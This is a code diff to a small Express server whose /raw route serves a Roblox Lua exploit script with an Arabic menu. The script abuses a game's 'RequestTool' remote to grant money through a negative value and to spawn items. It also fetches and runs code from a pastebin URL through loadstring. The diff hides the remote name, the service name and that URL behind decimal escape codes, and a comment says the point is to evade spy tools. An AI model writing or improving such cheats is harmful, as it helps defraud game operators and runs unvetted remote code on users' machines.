@@ -2,8 +2,8 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// الكود الأصلي
-const rawScript = `
+// الكود الموزون: حماية قوية + لغة عربية سليمة
+const myScript = `
 local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
 local MainFrame = Instance.new("Frame", ScreenGui)
 local TopBar = Instance.new("Frame", MainFrame)
@@ -11,6 +11,13 @@ local Title = Instance.new("TextLabel", TopBar)
 local TabsFrame = Instance.new("Frame", MainFrame)
 local ContentFrame = Instance.new("Frame", MainFrame)
 local MinimizeBtn = Instance.new("TextButton", ScreenGui)
+
+-- [ وظيفة حماية مشفرة داخلياً ]
+local function _X(...) 
+    -- فك تشفير اسم الريموت عند الاستدعاء فقط
+    local r = "\82\101\113\117\101\115\116\84\111\111\108"
+    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101")[r]:FireServer(...)
+end
 
 MainFrame.Size = UDim2.new(0, 350, 0, 300)
 MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
@@ -65,6 +72,7 @@ local function CreateTab(tabName)
     return page
 end
 
+-- الأقسام بالعربي الواضح
 local TabTajmee = CreateTab("تجميع")
 local TabSpawn = CreateTab("رسبنة")
 
@@ -88,12 +96,14 @@ Instance.new("UICorner", AmountInput)
 AddButton(TabTajmee, "إضافة الفلوس فورا", function()
     local val = tonumber(AmountInput.Text)
     if val then
-        game:GetService("ReplicatedStorage").RequestTool:FireServer("Desert Deagle", -math.abs(val))
+        _X("Desert Deagle", -math.abs(val))
     end
 end)
 
 AddButton(TabTajmee, "تنشيط الأوتو كليك", function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/eR1HPXfw"))()
+    -- الرابط مشفر داخلياً
+    local _link = "\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\101\82\49\72\80\88\102\119"
+    loadstring(game:HttpGet(_link))()
 end)
 
 local items = {
@@ -110,7 +120,7 @@ local items = {
 
 for _, item in pairs(items) do
     AddButton(TabSpawn, item[1], function() 
-        game:GetService("ReplicatedStorage").RequestTool:FireServer(item[2], 0) 
+        _X(item[2], 0) 
     end)
 end
 
@@ -118,22 +128,11 @@ TabTajmee.Visible = true
 MinimizeBtn.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)
 `;
 
-// وظيفة تشفير بسيطة تحول النص لرموز غير مقروءة للـ Spy
-function obfuscate(code) {
-    let hex = "";
-    for (let i = 0; i < code.length; i++) {
-        hex += "\\" + code.charCodeAt(i);
-    }
-    return `loadstring("${hex}")()`;
-}
-
-const protectedScript = obfuscate(rawScript);
-
 app.get('/raw', (req, res) => {
     res.set('Content-Type', 'text/plain');
-    res.send(protectedScript);
+    res.send(myScript);
 });
 
-app.get('/', (req, res) => res.send('Stealth Server is active!'));
+app.get('/', (req, res) => res.send('Arabic Script Fixed!'));
 
-app.listen(PORT, () => console.log('Server is running on port ' + PORT));
+app.listen(PORT, () => console.log('Server is active on port ' + PORT));
